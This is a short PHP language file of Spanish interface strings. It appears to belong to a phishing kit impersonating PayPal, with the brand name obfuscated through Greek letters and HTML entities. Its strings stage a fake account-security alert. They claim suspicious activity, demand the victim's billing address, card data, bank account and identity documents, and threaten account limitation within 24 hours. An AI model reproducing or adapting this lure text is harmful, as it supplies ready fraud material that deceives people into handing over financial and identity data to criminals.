<?php 
$log = "Cerrar Sesión";
$contact = "Contacto";
$feedback = "Feedback";
$privacy = "Intimidad";
$infottl = "Seguridad de &Rho;&#97;y&Rho;&#97;l";
$mo7 = "¿ Qué está mal ?";
$mo8 = "&Rho;&#97;y&Rho;&#97;l te protege contra los estafadores";
$mo9 = "Suspechamos que tu última actividad en tu cuenta.";
$mo10 = "Tendrá que seguir los siguientes pasos para restaurar el accesso a su cuenta:";
$mo11 = "Confirmar su dirección de facturatión.";
$mo12 = "Confirmar los datos de tu tarjeta.";
$mo13 = "Adjunte copias de los documentos requeridos.";
$mo14 = "Tiene 24 horas para confirmar su identidad, de lo contario, su cuenta será limitada.";
$mo19 ="Confirma tu cuenta bancaria.";
$process = "Iniciar proceso";
?>